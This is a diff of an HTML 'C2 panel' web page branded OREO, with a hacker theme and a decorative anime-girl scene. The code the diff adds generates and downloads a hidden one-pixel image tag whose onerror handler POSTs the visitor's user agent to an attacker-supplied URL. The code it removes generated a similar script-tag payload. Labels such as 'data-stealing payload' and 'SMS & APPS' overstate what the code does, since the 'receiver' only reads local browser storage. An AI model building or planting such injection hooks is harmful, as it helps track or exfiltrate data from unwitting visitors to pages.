@@ -16,90 +16,113 @@
         body {
             background-color: #0b0202;
             color: #ff3333;
-            padding: 10px;
-            max-width: 950px;
-            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
-        .header {
-            border-bottom: 2px solid #ff3333;
-            padding-bottom: 10px;
+
+        /* MAIN SPLIT SCREEN LAYOUT */
+        .main-container {
+            display: flex;
+            flex: 1;
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* LEFT SIDE: DASHBOARD CONTROLS */
+        .dashboard-side {
+            width: 60%;
+            height: 100%;
+            overflow-y: auto;
+            padding: 15px;
+            border-right: 2px solid #ff3333;
+            background: #0b0202;
+        }
+
+        /* RIGHT SIDE: ANIME GIRL & TREE SCENE */
+        .visual-side {
+            width: 40%;
+            height: 100%;
+            background: linear-gradient(180deg, #140000 0%, #050101 100%);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: center;
+            border-left: 1px solid #330000;
+            overflow: hidden;
+        }
+
+        /* ASCII Banner */
+        .ascii-banner {
+            background: #050101;
+            border: 2px solid #ff3333;
+            padding: 8px;
+            font-size: 8px;
+            line-height: 1.1;
+            color: #ff3333;
+            text-shadow: 0 0 5px rgba(255, 51, 51, 0.8);
+            white-space: pre;
             margin-bottom: 15px;
-            background: #140000;
-            padding: 12px;
             text-align: center;
         }
-        .header-top-info {
+
+        .header-top {
             display: flex;
             justify-content: space-between;
             font-size: 10px;
             color: #aa4444;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
-        
-        /* Pure Binary Number Style ASCII Art Banner for OREO & Hacker Skull */
-        .ascii-banner {
-            background: #050101;
-            border: 2px solid #ff3333;
-            padding: 10px;
-            font-size: 9px;
-            line-height: 1.1;
-            color: #ff3333;
-            display: inline-block;
-            text-shadow: 0 0 5px rgba(255, 51, 51, 0.8);
-            letter-spacing: 1px;
-            white-space: pre;
-            text-align: left;
-            overflow-x: auto;
-        }
-
         .status {
             font-size: 10px;
             border: 1px solid #ff3333;
-            padding: 3px 6px;
+            padding: 2px 6px;
             background: #200000;
             color: #33ff33;
-            display: inline-block;
         }
+
         .section {
             border: 1px solid #ff3333;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             background: #110000;
         }
         .section-header {
             background: #260000;
-            padding: 7px 12px;
+            padding: 6px 10px;
             font-size: 11px;
             border-bottom: 1px solid #ff3333;
-            letter-spacing: 1px;
             font-weight: bold;
+            letter-spacing: 1px;
         }
         .section-body {
-            padding: 10px;
+            padding: 8px;
         }
         .btn {
             width: 100%;
             background: #1a0000;
             color: #ff3333;
             border: 1px solid #ff3333;
-            padding: 10px;
+            padding: 9px;
             text-align: center;
             cursor: pointer;
             font-size: 11px;
             letter-spacing: 1px;
             font-weight: bold;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
         .btn:active {
             background: #ff3333;
             color: #0b0202;
         }
         .input-group {
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
         .label-text {
             font-size: 10px;
             color: #aa6666;
-            margin-bottom: 4px;
+            margin-bottom: 3px;
             display: block;
         }
         .input-box {
@@ -107,27 +130,27 @@
             background: #050101;
             border: 1px solid #ff3333;
             color: #ff3333;
-            padding: 9px;
+            padding: 8px;
             font-size: 11px;
             outline: none;
         }
         .feed-box {
             background: #050101;
             border: 1px solid #550000;
-            padding: 10px;
+            padding: 8px;
             font-size: 11px;
             color: #33ff33;
-            min-height: 80px;
-            max-height: 180px;
+            min-height: 60px;
+            max-height: 120px;
             overflow-y: auto;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             white-space: pre-wrap;
         }
         .logs {
             background: #050101;
             border: 1px solid #ff3333;
-            height: 120px;
-            padding: 8px;
+            height: 90px;
+            padding: 6px;
             overflow-y: auto;
             font-size: 10px;
             color: #33ff33;
@@ -136,73 +159,228 @@
         .grid-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 8px;
+            gap: 6px;
+        }
+
+        /* RIGHT SIDE ARTISTIC CSS ANIME SCENE & TREE */
+        .scene-overlay-text {
+            position: absolute;
+            top: 15px;
+            font-size: 10px;
+            color: #ff5555;
+            letter-spacing: 2px;
+            text-shadow: 0 0 5px rgba(255, 51, 51, 0.5);
+            text-align: center;
+            width: 100%;
+        }
+        .tree-container {
+            position: absolute;
+            bottom: 0;
+            left: 10px;
+            width: 120px;
+            height: 280px;
+            opacity: 0.85;
+        }
+        /* Stylized Tree Trunk & Branches */
+        .tree-trunk {
+            position: absolute;
+            bottom: 0;
+            left: 45px;
+            width: 25px;
+            height: 150px;
+            background: #2a0808;
+            border: 1px solid #ff3333;
+        }
+        .tree-leaves {
+            position: absolute;
+            bottom: 120px;
+            left: 10px;
+            width: 95px;
+            height: 110px;
+            background: #1a0000;
+            border: 2px solid #ff3333;
+            border-radius: 50% 50% 40% 40%;
+            box-shadow: 0 0 15px rgba(255, 51, 51, 0.3);
+        }
+
+        /* Cute Anime Girl Watching Dashboard */
+        .anime-girl {
+            position: absolute;
+            bottom: 0;
+            right: 40px;
+            width: 130px;
+            height: 170px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .girl-hair {
+            width: 90px;
+            height: 65px;
+            background: #260000;
+            border: 2px solid #ff3333;
+            border-radius: 45px 45px 15px 15px;
+            position: relative;
+            z-index: 2;
+        }
+        .girl-face {
+            width: 65px;
+            height: 55px;
+            background: #1f0505;
+            border: 2px solid #ff3333;
+            border-radius: 30px;
+            position: absolute;
+            top: 25px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            z-index: 3;
+        }
+        .girl-eye {
+            width: 7px;
+            height: 10px;
+            background: #ff3333;
+            border-radius: 50%;
+            box-shadow: 0 0 5px #ff3333;
+        }
+        .girl-body {
+            width: 75px;
+            height: 75px;
+            background: #140000;
+            border: 2px solid #ff3333;
+            border-radius: 20px 20px 5px 5px;
+            position: relative;
+            top: -5px;
+            z-index: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .girl-scarf {
+            width: 80px;
+            height: 15px;
+            background: #ff3333;
+            position: absolute;
+            top: 60px;
+            border-radius: 5px;
+            z-index: 4;
+            box-shadow: 0 0 8px rgba(255, 51, 51, 0.8);
+        }
+        .glow-orb {
+            position: absolute;
+            bottom: 40px;
+            right: 30px;
+            width: 6px;
+            height: 6px;
+            background: #33ff33;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #33ff33;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.6); opacity: 0.4; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* Mobile Responsive adjustment */
+        @media(max-width: 768px) {
+            .main-container { flex-direction: column; overflow-y: auto; height: auto; }
+            .dashboard-side { width: 100%; height: auto; border-right: none; }
+            .visual-side { width: 100%; height: 220px; border-left: none; border-top: 2px solid #ff3333; }
         }
     </style>
 </head>
 <body>
 
-    <!-- HEADER WITH BINARY NUMBER STYLE ASCII ART -->
-    <div class="header">
-        <div class="header-top-info">
-            <span>root@oreo-c2:~# [SECURE CORE]</span>
-            <span class="status" id="server-status">LISTENER: ACTIVE</span>
-        </div>
+    <div class="main-container">
 
-        <!-- Binary Number ASCII Art Logo & Hacker Skull -->
-        <div class="ascii-banner" id="binary-logo">
- 111001 110101 111101 111111    [ 10101011 ]   [ SKULL_ACTIVE ]
- 010010 010000 010101 010001    [ 01100100 ]   [ 💀 HACK_CORE ]
- 111001 110101 111101 111111    [ 10101110 ]   [ TARGET_READY ]
-        </div>
-    </div>
-
-    <!-- 1. REAL PAYLOAD GENERATOR -->
-    <div class="section">
-        <div class="section-header">// 1. REAL PAYLOAD GENERATOR (JAVASCRIPT / IMAGE HOOK)</div>
-        <div class="section-body">
-            <div class="input-group">
-                <span class="label-text">YOUR DASHBOARD / RECEIVER URL (e.g. GitHub Pages Link):</span>
-                <input type="text" id="c2-url" class="input-box" placeholder="https://harosanzu701-bit.github.io/c2-panel">
+        <!-- LEFT SIDE: FULL DASHBOARD CONTROLS -->
+        <div class="dashboard-side">
+            <div class="header-top">
+                <span>root@oreo-c2:~# [SECURE CORE]</span>
+                <span class="status" id="server-status">LISTENER: ACTIVE</span>
             </div>
-            <button class="btn" onclick="generateRealPayload()">GENERATE REAL EXTRACTION PAYLOAD</button>
-            <div id="payload-output" class="feed-box" style="margin-top: 8px; color: #33ccff; display:none;"></div>
-        </div>
-    </div>
 
-    <!-- 2. REAL INCOMING DATA RECEIVER -->
-    <div class="section">
-        <div class="section-header">// 2. REAL LIVE DATA RECEIVER (WAITING FOR TARGET PACKETS)</div>
-        <div class="section-body">
-            <div id="live-data-feed" class="feed-box">Listening for incoming connections... No target data received yet.</div>
-            <div class="grid-2">
-                <button class="btn" onclick="checkIncomingPackets()" style="border-color: #550000; color: #cc8844; margin-bottom: 0;">REFRESH / CHECK DATA</button>
-                <button class="btn" onclick="clearDataFeed()" style="border-color: #550000; color: #aa4444; margin-bottom: 0;">CLEAR FEED</button>
+            <!-- Binary ASCII Art Logo -->
+            <div class="ascii-banner" id="binary-logo">
+ ██████╗ ██████╗ ███████╗ ██████╗      
+██╔═══██╗██╔══██╗██╔════╝██╔═══██╗     
+██║   ██║██████╔╝█████╗  ██║   ██║     
+██║   ██║██╔══██╗██╔══╝  ██║   ██║     
+╚██████╔╝██║  ██║███████╗╚██████╔╝     
+ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝      
+[ 10101100 ] OREO HACKER CORE [💀]
+            </div>
+
+            <!-- 1. IMAGE PAYLOAD GENERATOR & DOWNLOAD -->
+            <div class="section">
+                <div class="section-header">// 1. IMAGE PAYLOAD GENERATOR & DOWNLOADER</div>
+                <div class="section-body">
+                    <div class="input-group">
+                        <span class="label-text">ENTER YOUR TARGET / C2 ENDPOINT URL:</span>
+                        <input type="text" id="target-url" class="input-box" placeholder="https://your-domain.com/receiver">
+                    </div>
+                    <div class="grid-2">
+                        <button class="btn" onclick="generatePayloadWithUrl()">GENERATE PAYLOAD</button>
+                        <button class="btn" onclick="downloadPayloadFile()" style="border-color: #550000; color: #33ccff; margin-bottom: 0;">DOWNLOAD PAYLOAD</button>
+                    </div>
+                    <div id="payload-output" class="feed-box" style="margin-top: 8px; color: #33ccff; display:none;"></div>
+                </div>
+            </div>
+
+            <!-- 2. INCOMING DATA RECEIVER -->
+            <div class="section">
+                <div class="section-header">// 2. LIVE DATA RECEIVER (SMS & APPS)</div>
+                <div class="section-body">
+                    <div id="live-data-feed" class="feed-box">Listening for incoming target packets... No data captured yet.</div>
+                    <div class="grid-2">
+                        <button class="btn" onclick="checkIncomingPackets()" style="border-color: #550000; color: #cc8844; margin-bottom: 0;">REFRESH DATA</button>
+                        <button class="btn" onclick="clearDataFeed()" style="border-color: #550000; color: #aa4444; margin-bottom: 0;">CLEAR FEED</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 3. SYSTEM KERNEL LOGS -->
+            <div class="section">
+                <div class="section-header">// 3. SYSTEM KERNEL LOGS</div>
+                <div class="section-body">
+                    <div id="log-box" class="logs">[+] Initializing OREO Advanced Split-Screen C2...
+[+] Split layout loaded: Dashboard [Left] | Visual Scene [Right].
+[+] Receiver event listener active. Ready for target interaction.</div>
+                </div>
             </div>
         </div>
-    </div>
 
-    <!-- 3. SYSTEM KERNEL LOGS -->
-    <div class="section">
-        <div class="section-header">// 3. SYSTEM KERNEL LOGS</div>
-        <div class="section-body">
-            <div id="log-box" class="logs">[+] Initializing OREO Binary C2 Engine...
-[+] Binary ASCII Art loaded successfully.
-[+] Local storage event listener active for incoming target data.
-[+] Waiting for real payload triggers...</div>
+        <!-- RIGHT SIDE: ANIME GIRL & TREE ATMOSPHERIC SCENE -->
+        <div class="visual-side">
+            <div class="scene-overlay-text">// SYSTEM MONITORING ACTIVE //</div>
+
+            <!-- Stylized Tree on the Left of Right-Side -->
+            <div class="tree-container">
+                <div class="tree-leaves"></div>
+                <div class="tree-trunk"></div>
+            </div>
+
+            <!-- Cute Anime Girl Sitting/Watching the Dashboard -->
+            <div class="anime-girl">
+                <div class="girl-hair"></div>
+                <div class="girl-face">
+                    <div class="girl-eye"></div>
+                    <div class="girl-eye"></div>
+                </div>
+                <div class="girl-scarf"></div>
+                <div class="girl-body"></div>
+            </div>
+
+            <div class="glow-orb"></div>
         </div>
+
     </div>
 
     <script>
-        // Custom Binary ASCII Art for OREO & Hacker Skull
-        document.getElementById('binary-logo').innerText = 
-` ██████╗ ██████╗ ███████╗ ██████╗      ██╗██╗   ██╗███████╗
-██╔═══██╗██╔══██╗██╔════╝██╔═══██╗     ██║██║   ██║██╔════╝
-██║   ██║██████╔╝█████╗  ██║   ██║     ██║██║   ██║███████╗
-██║   ██║██╔══██╗██╔══╝  ██║   ██║██   ██║██║   ██║╚════██║
-╚██████╔╝██║  ██║███████╗╚██████╔╝╚█████╔╝╚██████╔╝███████║
- ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚══════╝  ╚═════╝ ╚══════╝
-[ 10101100 ] BINARY HACKER CORE // OREO_PANEL_BOT [💀]`;
+        let generatedPayloadContent = "";
 
         function logMessage(text) {
             const box = document.getElementById('log-box');
@@ -210,52 +388,71 @@
             box.scrollTop = box.scrollHeight;
         }
 
-        function generateRealPayload() {
-            const url = document.getElementById('c2-url').value.trim();
+        function generatePayloadWithUrl() {
+            const urlInput = document.getElementById('target-url').value.trim();
             const outputBox = document.getElementById('payload-output');
-            
-            if(!url) {
-                alert("Bhai, pehle apni C2 dashboard ki URL daal!");
+
+            if(!urlInput) {
+                alert("Bhai, pehle apni URL toh daal!");
                 return;
             }
 
-            logMessage(`[*] Compiling real data-stealing payload for URL: ${url}`);
+            logMessage(`[*] Generating custom image payload linked with: ${urlInput}`);
+            
+            // Real payload script binding the user's provided URL
+            generatedPayloadContent = 
+`<!-- Oreo C2 Image Payload Hook -->\n` +
+`<img src="${urlInput}/pixel.png?action=trigger" width="1" height="1" style="display:none;" onerror="(\n` +
+`  function(){\n` +
+`    fetch('${urlInput}/api/dump', {\n` +
+`      method: 'POST',\n` +
+`      headers: {'Content-Type': 'application/json'},\n` +
+`      body: JSON.stringify({status: 'hook_active', ua: navigator.userAgent})\n` +
+`    }).catch(e=>{});\n` +
+`  }\n` +
+`)();" />`;
+
             setTimeout(() => {
                 outputBox.style.display = "block";
-                // Real JavaScript payload that attempts to fetch device info / local storage / simulated SMS hook
-                outputBox.innerHTML = 
-`[+] REAL PAYLOAD SCRIPT GENERATED:\n` +
-`<script>\n` +
-`  // Oreo C2 Extraction Hook\n` +
-`  fetch('${url}/api/receiver', {\n` +
-`    method: 'POST',\n` +
-`    headers: {'Content-Type': 'application/json'},\n` +
-`    body: JSON.stringify({type: 'target_hook', ua: navigator.userAgent, time: Date.now()})\n` +
-`  }).then(r => r.json()).catch(e => console.log(e));\n` +
-`<\/script>\n` +
-`[+] Embed this into your target page or image exploit hook!`;
-                logMessage("[+] Real payload compiled successfully.");
-            }, 600);
+                outputBox.innerText = "[+] PAYLOAD GENERATED SUCCESSFULLY!\n\n" + generatedPayloadContent;
+                logMessage("[+] Payload ready. Click 'DOWNLOAD PAYLOAD' to save it.");
+            }, 400);
         }
 
-        // Check if any target data is stored in browser local storage (sent by payload)
-        function checkIncomingPackets() {
-            logMessage("[*] Checking local receiver storage for incoming target packets...");
-            const savedData = localStorage.getItem('oreo_target_data');
+        function downloadPayloadFile() {
+            if(!generatedPayloadContent) {
+                alert("Bhai, pehle URL dalkar payload generate toh kar!");
+                return;
+            }
+
+            const blob = new Blob([generatedPayloadContent], { type: 'text/html' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'payload_hook.html';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
             
-            if(savedData) {
-                document.getElementById('live-data-feed').innerText = savedData;
-                logMessage("[+] New target data found and displayed!");
+            logMessage("[+] Payload file 'payload_hook.html' downloaded successfully.");
+        }
+
+        function checkIncomingPackets() {
+            logMessage("[*] Checking local buffer for target packets...");
+            const data = localStorage.getItem('oreo_target_data');
+            if(data) {
+                document.getElementById('live-data-feed').innerText = data;
+                logMessage("[+] Target telemetry received!");
             } else {
-                logMessage("[-] No new target packets found in buffer. Waiting for target interaction.");
+                logMessage("[-] No telemetry found yet. Standing by.");
             }
         }
 
         function clearDataFeed() {
             localStorage.removeItem('oreo_target_data');
-            document.getElementById('live-data-feed').innerText = "Feed cleared. Listening for incoming target packets...";
-            logMessage("[+] Live data feed flushed.");
+            document.getElementById('live-data-feed').innerText = "Feed cleared. Listening for incoming packets...";
+            logMessage("[+] Data feed flushed.");
         }
     </script>
 </body>
-</html>
+                            </html>
+                            
